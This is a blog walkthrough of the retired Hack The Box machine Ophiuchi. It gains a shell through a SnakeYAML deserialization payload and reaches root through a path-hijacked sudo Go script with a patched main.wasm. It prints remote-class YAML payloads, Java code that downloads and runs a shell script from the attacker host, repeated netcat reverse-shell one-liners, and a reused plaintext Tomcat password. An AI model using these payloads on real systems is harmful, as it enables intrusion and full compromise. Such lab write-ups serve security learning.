---
layout: single
title: "Walktrough: HTB Ophiuchi"
namespace: htb-ophiuchi
category: Walkthrough
tags:
  - HackTheBox
  - HTB Medium
  - HTB Linux
date: 2021-07-03 16:00:00
header:
  teaser: https://i.imgur.com/r9JpwZX.png
  og_image: *teaser
redirect_from: /writeup/2021/07/htb-ophiuchi
---

Hello guys!

This week's machine will be **Ophiuchi**, another medium-rated box from [Hack The Box](https://www.hackthebox.eu/), created by [felamos](https://app.hackthebox.eu/users/27390).<!--more-->

:information_source: **Info**: Write-ups for Hack The Box machines are posted as soon as they’re retired.
{: .notice--info}

![htb-ophiuchi](https://i.imgur.com/RgW95kn.png){: .align-center}

Recently I have been starting the recon of HTB boxes by searching a little about their names, as it or their images can give some cues on how to pwn them.

Searching `define ophiuchi` in Google I was redirected to `define Ophiuchus, which is commonly represented as a man grasping a **snake**, what makes sense once we have a picture of a planet, astronaut, and some stars, but we'll see that isn't only that! :smiley:

## Enumeration

Starting the enumeration, as usual, running a quick `nmap` scan to find the published services.

```bash
$ nmap -sC -sV -Pn -oA quick 10.10.10.227
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-27 17:32 -03
Nmap scan report for 10.10.10.227
Host is up (0.077s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 6d:fc:68:e2:da:5e:80:df:bc:d0:45:f5:29:db:04:ee (RSA)
|   256 7a:c9:83:7e:13:cb:c3:f9:59:1e:53:21:ab:19:76:ab (ECDSA)
|_  256 17:6b:c3:a8:fc:5d:36:08:a1:40:89:d2:f4:0a:c6:46 (ED25519)
8080/tcp open  http    Apache Tomcat 9.0.38
|_http-title: Parse YAML
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.18 seconds
```

### 8080/TCP - Tomcat

Accessing the Tomcat page at `http://10.10.10.227:8080` we see a YAML parser website, as below:

![Ophiuchi - Parse YAML](https://i.imgur.com/oDXT0S9.png){: .align-center}

Sending a simple payload (`teste: true`), the following message is returned:

> Due to security reasons this feature has been temporarily on hold. We will soon fix the issue!

Once Tomcat is a Java web server, and, based on the message returned, searched about `java yaml rce vulnerability` where I've found a [Medium post](https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858) talking about a vuln called **SnakeYAML**, which had a PoC like the website we have. Also, as *snake* have some references to the constellation from which this box was named, proves we're on the right path :smile:.

Following the suggestion in the post, started a simple http server using python (`sudo python3 -m http.server 80`) and sent the following payload:

```java
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://10.10.10.10/"]
  ]]
]
```

Just like the PoC in the blog post, the server searches for a file in `/META-INF/services/javax.script.ScriptEngineFactory` should provide a java class to be executed, which was confirmed based on the logs below.

```bash
$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.227 - - [28/Feb/2021 12:19:22] code 404, message File not found
10.10.10.227 - - [28/Feb/2021 12:19:22] "HEAD /META-INF/services/javax.script.ScriptEngineFactory HTTP/1.1" 404 -
```

## Initial access

To gain initial access to this machine, used the project referenced in the blog post found ([artsploit/yaml-payload: A tiny project for generating SnakeYAML deserialization payloads](https://github.com/artsploit/yaml-payload)).

```bash
git clone https://github.com/artsploit/yaml-payload.git
```

As recommended, we'll add our payload in the class named `AwesomeScriptEngineFactory.java` compile it and invoke it from the payload sent in the form.

First I have tried to use payload `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4443 >/tmp/f` directly in the class `yaml-payload\src\artsploit\AwesomeScriptEngineFactory.java` but as it uses some redirects and pipelines (`>` e `|`) noticed that the best approach would host a payload file in the webserver, download it and run from the victim machine, as the edit below:

```java
    public AwesomeScriptEngineFactory() {
        try {
            Runtime.getRuntime().exec("wget http://10.10.10.10/payload -O /tmp/exploit.sh");
            Runtime.getRuntime().exec("chmod a+x /tmp/exploit.sh");
            Runtime.getRuntime().exec("bash /tmp/exploit.sh");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
```

After modified, compiled the class and copied to the path where it was being called from:

```bash
javac src/artsploit/AwesomeScriptEngineFactory.java
jar -cvf yaml-payload.jar -C src/ .
```

After that, as well as copying the payload file to be executed, sent the payload below on the webpage

```java
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://10.10.10.10/yaml-payload.jar"]
  ]]
]
```

And voilá! We got a reverse shell in the box! :smile:

```bash
bash-5.0$ hostname && id
ophiuchi
uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
bash-5.0$
```

## User flag

Started the enumeration, as usual, using `linpeas.sh`, where I could identify the following points:

- Tomcat service running with its specific account, allowing us to read the app files and logs
- Enumerating the users in this box, found **admin**, the only one with console access (besides root).

With this information, verified the creds for Tomcat from `/opt/tomcat/conf/tomcat-users.xml` file, where the password **whythereisalimit** was found.

```xml
<user username="admin" password="whythereisalimit" roles="manager-gui,admin-gui"/>
```

Testing it for the user admin, we have confirmed that it was valid.

![Ophiuchi - Tomcat Manager](https://i.imgur.com/x7m50Ah.png){: .align-center}

Once we have a Linux user with the same name `admin`, once tried to reuse the same creds using ssh, I was successful in logging in, obtaining the user's flag.

```bash
Last login: Sun Apr 18 01:22:24 2021 from 10.10.10.10
-bash-5.0$ hostname && id
ophiuchi
uid=1000(admin) gid=1000(admin) groups=1000(admin)
-bash-5.0$ cat user.txt 
<redacted>
-bash-5.0$
```

## Root flag

Besides always give `linpeas.sh` another try, once we have the password for the user I like to check if the user can run anything with root privileges, where in this case we were lucky and got the following output:

```bash
-bash-5.0$ sudo -l
Matching Defaults entries for admin on ophiuchi:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User admin may run the following commands on ophiuchi:
    (ALL) NOPASSWD: /usr/bin/go run /opt/wasm-functions/index.go
```

Inspecting the file `/opt/wasm-functions/index.go` we have the following content:

```go
package main

import (
        "fmt"
        wasm "github.com/wasmerio/wasmer-go/wasmer"
        "os/exec"
        "log"
)


func main() {
        bytes, _ := wasm.ReadBytes("main.wasm")

        instance, _ := wasm.NewInstance(bytes)
        defer instance.Close()
        init := instance.Exports["info"]
        result,_ := init()
        f := result.String()
        if (f != "1") {
                fmt.Println("Not ready to deploy")
        } else {
                fmt.Println("Ready to deploy")
                out, err := exec.Command("/bin/sh", "deploy.sh").Output()
                if err != nil {
                        log.Fatal(err)
                }
                fmt.Println(string(out))
        }
}
```

As we can see, this is a Go Lang script that loads its variables from `main.wasm` and, if the value `f` under property `info` is equal to **1**, the file `deploy.sh` is executed.

As both files (`main.wasm` e `deploy.sh`) execute from a relative path, they are vulnerable to **path hijacking**, which we'll try now.

The initial step is to create both files and start them from a directory we have to write permissions, in this case, `/dev/shm`.

```bash
mkdir /dev/shm/zurc
cd /dev/shm/zurc
```

### `deploy.sh`

Creating this file is easy. At first, I'll just place an `id` command to be sure we have succeeded with the permission abuse.

```bash
#!/bin/bash

id
```

Once confirmed, we'll replace this file contents with the reverse shell command line below

```bash
#!/bin/bash

rm /tmp/zurc;mkfifo /tmp/zurc;cat /tmp/zurc|/bin/sh -i 2>&1|nc 10.10.10.10 4443 >/tmp/zurc
```

### `main.wasm`

This item is a little more complex to craft as when I first opened it in the editor, noticed that was something compiled and not plain text.

Searching a little on how to modify a wasm file, found this blog post on Mozilla developers [on how to convert a WebAssembly Text to WASM](https://developer.mozilla.org/en-US/docs/WebAssembly/Text_format_to_wasm), which also refers to the repo [WebAssembly/wabt: The WebAssembly Binary Toolkit no GitHub](https://github.com/webassembly/wabt).

The following steps were used to inspect and modify the `main.wasm` file:

- Locate the file in the victim machine and make a copy using `scp`

  ```bash
  # Ophiuchi
  admin@ophiuchi:~$ find / -type f 2> /dev/null | grep main.wasm
  /opt/wasm-functions/main.wasm
  /opt/wasm-functions/backup/main.wasm
  ```

  ```bash
  # Attacker Machine
  $ cd ./loot
  $ scp admin@10.10.10.227:/opt/wasm-functions/main.wasm .
  ```

- Downloaded the compiled `wabt` version to my working directory and extracted it

  ```bash
  wget https://github.com/WebAssembly/wabt/releases/download/1.0.23/wabt-1.0.23-ubuntu.tar.gz
  tar -xzvf wabt-1.0.23-ubuntu.tar.gz
  ```

- Using the recently downloaded tool, converted the `main.wasm` to `main.wat`, where we got the following content

  ```bash
  $ wabt-1.0.23/bin/wasm2wat main.wasm -o main.wat
  $ cat main.wat                                                                                           
  (module
    (type (;0;) (func (result i32)))
    (func $info (type 0) (result i32)
        i32.const 0)
    (table (;0;) 1 1 funcref)
    (memory (;0;) 16)
    (global (;0;) (mut i32) (i32.const 1048576))
    (global (;1;) i32 (i32.const 1048576))
    (global (;2;) i32 (i32.const 1048576))
    (export "memory" (memory 0))
    (export "info" (func $info))
    (export "__data_end" (global 1))
    (export "__heap_base" (global 2)))
  ```

- Once we need to return `f == 1`, which is a property of `info`, we needed to change the line `i32.const 0` to `i32.const 1` at line 4.

- After changing it, compiled the file again to `main.wasm` and transferred it to the victim machine as below

  ```bash
  wabt-1.0.23/bin/wat2wasm main.wat -o main.wasm
  scp main.wasm admin@10.10.10.227:/dev/shm/zurc
  ```
  
- In a second attempt, we had success on running the crafted deploy.sh as root :smiley:

  ```bash
  admin@ophiuchi:/dev/shm/zurc$ sudo /usr/bin/go run /opt/wasm-functions/index.go
  Ready to deploy
  uid=0(root) gid=0(root) groups=0(root)
  ```

- After that, modified the file to the previously shared reverse shell command line, obtained interactive access as root, and was able to get its flag.

  ```bash
  $ nc -lnvp 4443
  listening on [any] 4443 ...
  connect to [10.10.10.10] from (UNKNOWN) [10.10.10.227] 50068
  # hostname && id
  ophiuchi
  uid=0(root) gid=0(root) groups=0(root)
  # cat /root/root.txt
  <redacted>
  ```

I hope you have enjoyed it!

See you in the next post :smile:
